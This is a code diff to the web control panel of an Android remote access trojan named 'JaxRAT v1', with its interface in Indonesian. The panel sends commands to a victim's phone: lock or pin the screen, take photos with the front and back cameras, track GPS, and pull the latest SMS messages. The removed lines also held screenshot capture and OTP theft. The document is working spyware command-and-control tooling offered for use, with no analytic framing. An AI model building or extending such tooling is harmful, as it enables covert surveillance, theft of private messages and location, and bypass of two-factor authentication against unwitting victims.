@@ -5,10 +5,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>JaxRAT v1 - Kontrol</title>
     <style>
-        body { background-color: #050505; color: #fff; font-family: 'Courier New', monospace; padding: 16px; margin: 0; }
+        body { background-color: #050505; color: #fff; font-family: 'Courier New', monospace; padding: 16px; margin: 0; -webkit-tap-highlight-color: transparent; }
         .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #00ff00; padding-bottom: 10px; margin-bottom: 20px; }
         .header h1 { font-size: 20px; color: #00ff00; margin: 0; }
-        .btn-back { background: #000; color: #00ff00; border: 2px solid #00ff00; padding: 10px; text-decoration: none; font-weight: bold; border-radius: 8px; }
+        .btn-back { background: #000; color: #00ff00; border: 2px solid #00ff00; padding: 10px 15px; text-decoration: none; font-weight: bold; border-radius: 8px; }
         .btn-panic { background-color: #2a0000; color: #ff3b30; border: 2px solid #ff3b30; width: 100%; padding: 20px; font-size: 20px; font-weight: bold; border-radius: 16px; margin-bottom: 20px; cursor: pointer; }
         .card { background-color: #121212; border: 2px solid #2a2a2a; border-radius: 24px; margin-bottom: 20px; overflow: hidden; }
         .card-header { padding: 24px; display: flex; align-items: center; justify-content: space-between; cursor: pointer; }
@@ -39,16 +39,12 @@
         .status { margin-bottom: 20px; padding: 15px; border: 1px dashed #00ff00; text-align: center; color: #00ff00; background: #001100; border-radius: 10px;}
         .grid-btn { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
         
-        /* Modal */
         .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.8); z-index: 1000; justify-content: center; align-items: center; }
         .modal-content { background: #121212; border: 2px solid #00ff00; border-radius: 16px; width: 90%; max-width: 400px; padding: 20px; }
-        .modal-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 15px; }
-        .modal-title { color: #00ff00; font-weight: bold; font-size: 18px; }
+        .modal-header { display: flex; justify-content: space-between; border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 15px; }
+        .modal-title { color: #00ff00; font-weight: bold; }
         .btn-close { background: none; border: none; color: #ff3b30; font-size: 24px; cursor: pointer; }
-        .modal-body { color: #fff; font-size: 16px; max-height: 400px; overflow-y: auto; }
-        .sms-item { background: #222; padding: 10px; border-radius: 8px; border-left: 4px solid #00ff00; margin-bottom: 10px; }
-        .sms-sender { color: #aaa; font-size: 12px; }
-        .img-preview { width: 100%; border-radius: 8px; border: 2px solid #333; }
+        .img-preview { width: 100%; border-radius: 8px; }
     </style>
 </head>
 <body>
@@ -57,21 +53,23 @@
         <a href="/" class="btn-back">← Kembali</a>
     </div>
     <div class="status" id="status-box">Menunggu perintah...</div>
-    <button class="btn-panic" onclick="kirimPerintah('STOP_ALL')">🚨 HENTIKAN SEMUA (PANIC) 🚨</button>
     
+    <button class="btn-panic" onclick="kirimPerintah('STOP_ALL')">🚨 HENTIKAN SEMUA (PANIC) 🚨</button>
+
     <div class="card">
         <div class="card-header">
             <div class="card-left"><div class="icon-box icon-yellow">🔦</div><div class="text-container"><div class="title">Senter</div><div class="subtitle">Kelap-kelip</div></div></div>
             <label class="switch"><input type="checkbox" id="switch_senter" onchange="toggleSenter(this)"><span class="slider"></span></label>
         </div>
     </div>
+
     <div class="card">
         <div class="card-header" onclick="kirimPerintah('lock_device')">
             <div class="card-left"><div class="icon-box icon-purple">📴</div><div class="text-container"><div class="title">Kunci Layar HP</div><div class="subtitle">Matikan layar</div></div></div>
             <div class="arrow">❯</div>
         </div>
     </div>
-    
+
     <div class="card">
         <div class="card-header" onclick="toggleMenu('menu_pinning', this)">
             <div class="card-left"><div class="icon-box icon-red">🔒</div><div class="text-container"><div class="title">Screen Pinning</div><div class="subtitle">Kunci Custom</div></div></div>
@@ -90,7 +88,7 @@
             <button class="action-btn action-btn-red" onclick="kirimPerintah('unpin_screen')">LEPAS SEMATAN</button>
         </div>
     </div>
-    
+
     <div class="card">
         <div class="card-header" onclick="toggleMenu('menu_spy', this)">
             <div class="card-left"><div class="icon-box icon-blue">🕵️</div><div class="text-container"><div class="title">Data & Spy</div><div class="subtitle">Ambil data HP</div></div></div>
@@ -98,12 +96,10 @@
         </div>
         <div class="sub-menu" id="menu_spy">
             <div class="grid-btn">
-                <button class="action-btn" onclick="bukaModalGambar('screenshot')">📸 Screenshot</button>
-                <button class="action-btn" onclick="bukaModalGambar('camera_front')">🤳 Kamera Depan</button>
-                <button class="action-btn" onclick="bukaModalGambar('camera_back')">📷 Kamera Belakang</button>
-                <button class="action-btn" onclick="bukaModalTeks('gps')">📍 Lacak GPS</button>
-                <button class="action-btn" onclick="bukaModalTeks('sms')">📩 Ambil SMS</button>
-                <button class="action-btn" onclick="kirimPerintah('get_otp')">🔑 Ambil OTP</button>
+                <button class="action-btn" onclick="bukaModal('camera_front')">🤳 Kamera Depan</button>
+                <button class="action-btn" onclick="bukaModal('camera_back')">📷 Kamera Belakang</button>
+                <button class="action-btn" onclick="bukaModal('gps')">📍 Lacak GPS</button>
+                <button class="action-btn" onclick="bukaModal('sms')">📩 Ambil SMS</button>
             </div>
         </div>
     </div>
@@ -138,14 +134,11 @@
         function kirimPerintah(cmd) {
             statusBox.innerText = "Mengirim: " + cmd;
             fetch('/api/command/' + deviceId, {
-                method: 'POST', 
-                headers: { 'Content-Type': 'application/json' },
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ command: cmd })
-            }).then(function(res) { return res.json(); }).then(function(data) {
+            }).then(res => res.json()).then(data => {
                 statusBox.innerText = "✅ Terkirim: " + cmd;
-            }).catch(function(err) { 
-                statusBox.innerText = "❌ Gagal!"; 
-            });
+            }).catch(err => { statusBox.innerText = "❌ Gagal!"; });
         }
 
         function toggleSenter(checkbox) {
@@ -164,59 +157,51 @@
             kirimPerintah(cmd);
         }
 
-        function bukaModalTeks(type) {
-            document.getElementById('myModal').style.display = 'flex';
-            document.getElementById('modal-title').innerText = (type === 'gps') ? '📍 Lokasi GPS' : '📩 10 SMS Terakhir';
-            document.getElementById('modal-body').innerHTML = '<div style="text-align:center;">⏳ Mengambil data...</div>';
-            kirimPerintah(type === 'gps' ? 'get_gps' : 'get_sms');
-            
+        function tutupModal() {
+            document.getElementById('myModal').style.display = 'none'; 
             if(intervalId) clearInterval(intervalId);
-            intervalId = setInterval(function() { cekDataTeks(type); }, 2000);
         }
 
-        function cekDataTeks(type) {
-            fetch('/api/get_results/' + deviceId).then(function(res) { return res.json(); }).then(function(data) {
+        function bukaModal(type) {
+            document.getElementById('myModal').style.display = 'flex';
+            document.getElementById('modal-body').innerHTML = '<div style="text-align:center;">⏳ Mengambil data...</div>';
+            
+            if (type === 'gps' || type === 'sms') {
+                document.getElementById('modal-title').innerText = type === 'gps' ? '📍 Lokasi GPS' : '📩 10 SMS Terakhir';
+                kirimPerintah(type === 'gps' ? 'get_gps' : 'get_sms');
+                if(intervalId) clearInterval(intervalId);
+                intervalId = setInterval(() => { cekTeks(type); }, 2000);
+            } else {
+                document.getElementById('modal-title').innerText = '📸 Mengambil Gambar...';
+                kirimPerintah(type);
+                if(intervalId) clearInterval(intervalId);
+                intervalId = setInterval(() => {
+                    var img = new Image();
+                    img.onload = function() {
+                        clearInterval(intervalId);
+                        document.getElementById('modal-title').innerText = '📸 Hasil Gambar';
+                        document.getElementById('modal-body').innerHTML = '<img src="' + img.src + '" class="img-preview">';
+                    };
+                    img.src = '/static/uploads/latest.jpg?t=' + new Date().getTime();
+                }, 3000);
+            }
+        }
+
+        function cekTeks(type) {
+            fetch('/api/get_results/' + deviceId).then(res => res.json()).then(data => {
                 var html = '';
                 if(type === 'gps' && data.gps && data.gps !== "Belum ada data") {
                     clearInterval(intervalId);
                     html = '<div style="font-size: 20px; text-align: center; margin-bottom: 15px;">' + data.gps + '</div>' +
-                           '<button class="action-btn" onclick="navigator.clipboard.writeText(\'' + data.gps + '\'); alert(\'Disalin!\')">📋 Salin</button>';
-                    document.getElementById('modal-body').innerHTML = html;
-                } 
-                else if(type === 'sms' && data.sms && data.sms.length > 0) {
+                           '<button class="action-btn" onclick="navigator.clipboard.writeText(\'' + data.gps + '\'); alert(\'Disalin!\')">📋 Salin Koordinat</button>';
+                } else if(type === 'sms' && data.sms && data.sms.length > 0) {
                     clearInterval(intervalId);
-                    for(var i=0; i<data.sms.length; i++) {
-                        html += '<div class="sms-item"><div class="sms-sender">Dari: ' + data.sms[i].address + '</div><div>' + data.sms[i].body + '</div></div>';
-                    }
-                    document.getElementById('modal-body').innerHTML = html;
+                    data.sms.forEach(sms => {
+                        html += '<div style="background:#222; padding:10px; margin-bottom:5px; border-left:4px solid #00ff00;">' + sms.address + ': ' + sms.body + '</div>';
+                    });
                 }
+                if (html !== '') document.getElementById('modal-body').innerHTML = html;
             });
-        }
-
-        function bukaModalGambar(cmdType) {
-            document.getElementById('myModal').style.display = 'flex';
-            document.getElementById('modal-title').innerText = '📸 Mengambil Gambar...';
-            document.getElementById('modal-body').innerHTML = '<div style="text-align:center;">⏳ Menunggu HP mengirim gambar...</div>';
-            kirimPerintah(cmdType);
-            
-            if(intervalId) clearInterval(intervalId);
-            intervalId = setInterval(function() {
-                var imgUrl = '/static/uploads/latest.jpg?t=' + new Date().getTime();
-                var img = new Image();
-                img.onload = function() {
-                    clearInterval(intervalId);
-                    document.getElementById('modal-title').innerText = '📸 Hasil Gambar';
-                    document.getElementById('modal-body').innerHTML = 
-                        '<img src="' + imgUrl + '" class="img-preview">' +
-                        '<button class="action-btn" style="background:#00ff00;" onclick="alert(\'Gambar Tersimpan!\')">💾 Simpan ke Galeri</button>';
-                };
-                img.src = imgUrl;
-            }, 3000);
-        }
-
-        function tutupModal() {
-            document.getElementById('mymodal').style.display = 'none';
-            if(intervalId) clearInterval(intervalId);
         }
     </script>
 </body>
